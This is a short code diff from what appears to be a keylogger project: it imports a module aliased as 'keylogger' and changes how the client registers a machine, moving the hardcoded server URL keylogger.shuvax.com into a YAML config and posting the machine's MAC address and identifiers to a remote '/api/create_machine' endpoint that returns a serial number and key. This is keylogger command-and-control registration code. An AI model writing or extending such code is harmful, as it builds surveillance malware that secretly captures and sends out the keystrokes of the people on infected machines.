@@ -1,7 +1,10 @@
 import manager as keylogger
-import requests, uuid, socket
+import requests, uuid, socket,yaml
 
-url = 'https://keylogger.shuvax.com/api/create_machine'
+with open("config.yaml", "r") as f:
+    config = yaml.safe_load(f)
+
+URL = config['general']['base_url']
 
 
 
@@ -15,7 +18,7 @@ def create_logger():
         "mac address": mac_address
     }
     try:
-        response = requests.post(url, json=data)
+        response = requests.post(URL + '/api/create_machine', json=data)
         response_dict = response.json()
         number = response_dict['serial_number']
         key = response_dict['key']
